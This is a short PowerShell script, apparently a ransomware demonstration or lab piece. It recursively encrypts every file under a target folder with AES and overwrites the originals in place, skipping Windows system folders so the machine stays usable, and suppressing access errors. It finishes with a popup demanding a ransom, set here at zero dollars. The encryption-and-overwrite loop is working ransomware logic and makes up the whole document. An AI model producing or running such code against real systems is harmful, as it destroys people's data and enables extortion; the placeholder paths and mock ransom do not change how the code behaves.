#Loads encryption function from the Protect-AesFile
. "C:\Path\Protect-AesFile.ps1" 

#path to the source file/folder/drive to be encrypted 
$FilesToEncrypt = "C:\Path\Example_Test_Files"

#storage path where encrypted files will be stored temporarily 
$Storage = "C:\Path\Storage" 

#exclude critical files from encrypting so program can run smoothly and the machine isn't damaged 
$ExcludePattern = "^C:\\Windows|^C:\\Program Files|^C:\\Program Files \(x86\)"

#Gets each object from the path given by using a for loop and recursion is used to reach all files if needed 
#errors (mainly access based) are ignored so the program can run smoothly 
Get-ChildItem -Path $FilesToEncrypt -File -Recurse -Force -ErrorAction SilentlyContinue | 
    Where-Object { $_.FullName -notmatch $ExcludePattern } | 
    ForEach-Object {
        #creates storage file 
        New-Item -Path $Storage -ItemType Directory -Force | Out-Null

        # Calculate new path, preserving folder structure in the output folder 
        $relativePath = $_.FullName.Substring($FilesToEncrypt.Length)
        $newPath   = Join-Path -Path $Storage -ChildPath ($relativePath + ".enc")

        #Call the encryption function, Protect-AesFile on each object 
        #Overwrite the contents of the original object with the encrypted contents in the temporary storage file 
        try {
            Write-Host "Encrypting: $($_.FullName)"
            Protect-AesFile -InFile $_.FullName -OutFile  $newPath -PasswordFile Password.txt
            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newPath))
        }
        catch {
            Write-Warning "Unable to encrypt: $($_.FullName). Receiving error: $($_.Message)"
        }
}
$wshell = New-Object -ComObject Wscript.Shell
$result = $wshell.popup("Pay the Ransom (0 Dollars and 0 Cents)........You've been encrypted", 0)
